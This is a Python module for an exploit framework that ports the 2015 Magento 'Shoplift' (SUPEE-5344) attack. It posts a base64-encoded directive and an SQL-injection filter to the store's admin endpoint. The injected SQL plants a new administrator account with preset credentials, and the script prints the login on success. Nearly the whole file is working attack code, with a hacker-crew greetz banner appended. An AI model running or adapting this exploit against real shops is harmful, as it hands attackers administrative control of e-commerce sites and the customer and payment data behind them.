from basic import Exploit
import oops

import requests
import base64


class TotsModule(Exploit):
    def __init__(self, provided_argument_string=""):
        super().__init__(provided_argument_string)

    def local_arguments(self):
        return [
            {"name": "target", "type": str, "nargs": "+", "help": "Target for the exploit",
             "default": "http://SLD.TLD"},
            {"name": "directory", "type": str, "nargs": "+", "help": "Directory for the exploit",
             "default": "/admin/Cms_Wysiwyg/directive/index"},
            {"name": "username", "type": str, "nargs": "+", "help": "User to add",
             "default": "forme"},
            {"name": "password", "type": str, "nargs": "+", "help": "Password for the User",
             "default": "forme"},
        ]

    def execute(self):
        if not self.target.startswith("http"):
            raise oops.IncorrectArgument("Your target did not start with http")

        self.target = self.target.rstrip("/")

        target_url = self.target + self.directory

        base_query = """
SET @SALT = 'rp';
SET @PASS = CONCAT(MD5(CONCAT( @SALT , '{password}') ), CONCAT(':', @SALT ));
SELECT @EXTRA := MAX(extra) FROM admin_user WHERE extra IS NOT NULL;
INSERT INTO `admin_user` (`firstname`, `lastname`,`email`,`username`,`password`,`created`,`lognum`,`reload_acl_flag`,`is_active`,`extra`,`rp_token`,`rp_token_created_at`) VALUES ('Firstname','Lastname','email@example.com','{username}',@PASS,NOW(),0,0,1,@EXTRA,NULL, NOW());
INSERT INTO `admin_role` (parent_id,tree_level,sort_order,role_type,user_id,role_name) VALUES (1,2,0,'U',(SELECT user_id FROM admin_user WHERE username = '{username}'),'Firstname');
"""

        exploit_query = base_query.replace("\n", "").format(username=self.username, password=self.password)

        popularity_filter = "popularity[from]=0&popularity[to]=3&popularity[field_expr]=0);{0}".format(exploit_query)

        data_for_request = {
            "___directive": str(
                base64.b64encode("{{block type=Adminhtml/report_search_grid output=getCsvFile}}".encode("ascii")),
                "ascii"),
            "filter": str(base64.b64encode(popularity_filter.encode("ascii")), "ascii"),
            "forwarded": 1}

        request_response = requests.post(target_url, data=data_for_request)

        if request_response.ok:
            print("Looks like it worked, try logging in with Username: {username}, Password:{password}".format(
                username=self.username, password=self.password))
        else:
            raise oops.ExploitFailure("Looks like it did not work, perhaps this is not the correct target")

    def thanks(self):
        print("""
- -==[[Greetz To]] == --
############################################################################################
# Guru ji zero ,code breaker ica, root_devil, google_warrior,INX_r0ot,Darkwolf indishell,Baba,
# Silent poison India,Magnum sniper,ethicalnoob Indishell,Reborn India,L0rd Crus4d3r,cool toad,
# Hackuin,Alicks,mike waals,Suriya Prakash, cyber gladiator,Cyber Ace,Golden boy INDIA,
# Ketan Singh,AR AR,saad abbasi,Minhal Mehdi ,Raj bhai ji ,Hacking queen,lovetherisk,Bikash Dash
#############################################################################################
- -==[[Love to]] == --
# My Father ,my Ex Teacher,cold fire hacker,Mannu, ViKi ,Ashu bhai ji,Soldier Of God, Bhuppi,
# Mohit,Ffe,Ashish,Shardhanand,Budhaoo,Jagriti,Salty and Don(Deepika kaushik)
- -==[[Special Fuck goes to]] == --
< 3
suriya
Cyber
Tyson < 3
""")

    def help(self):
        return """
##################################################################################################
# Exploit Title : Magento Shoplift exploit (SUPEE-5344)
# Author        : Manish Kishan Tanwar AKA error1046
# Date          : 25/08/2015
# Love to       : zero cool,Team indishell,Mannu,Viki,Hardeep Singh,Jagriti,Kishan Singh and ritu rathi
# Debugged At  : Indishell Lab(originally developed by joren)
##################################################################################################

# Thanks to
# Zero cool, code breaker ICA, Team indishell, my father , rr mam, jagriti and DON
"""
